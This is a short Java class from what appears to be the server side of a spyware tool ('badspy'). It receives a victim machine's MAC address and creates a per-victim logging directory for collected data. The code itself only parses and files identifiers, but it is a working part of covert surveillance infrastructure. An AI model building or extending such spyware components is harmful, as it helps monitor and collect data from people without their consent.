package com.blogspot.sontx.badspy.badserver.bo.spyworker;

import com.blogspot.sontx.badspy.badserver.Config;
import com.blogspot.sontx.badspy.badserver.bo.SpyReader;
import com.blogspot.sontx.badspy.badserver.bo.Receiver;
import com.blogspot.sontx.badspy.badserver.bo.SpyWriter;
import com.blogspot.sontx.jlog.Log;

import java.io.File;
import java.io.IOException;

/**
 * Copyright 2016 by sontx
 * Created by sontx on 20/4/2016.
 */
public class SpyMACReceiver extends Receiver {
    private String victimDir = null;

    public SpyMACReceiver(SpyReader reader, SpyWriter writer, int dataLength) {
        super(reader, writer, dataLength);
    }

    private String MACToString(byte[] mac) {
        return String.format("%02X-%02X-%02X-%02X-%02X-%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    }

    @Override
    public void start() throws IOException {
        if (dataLength == 6) {
            byte[] buffer = new byte[dataLength];
            if (reader.read(buffer) == buffer.length) {
                String macString = MACToString(buffer);
                victimDir = macString;
                File victimFile = new File(Config.LOGGING_DIR, victimDir);
                if (!victimFile.isDirectory()) {
                    if (!victimFile.mkdirs())
                        victimDir = null;
                    else
                        Log.i(String.format("Received MAC address: %s", victimDir));
                }
            }
        }
    }

    public String getVictimDir() {
        return victimDir;
    }
}
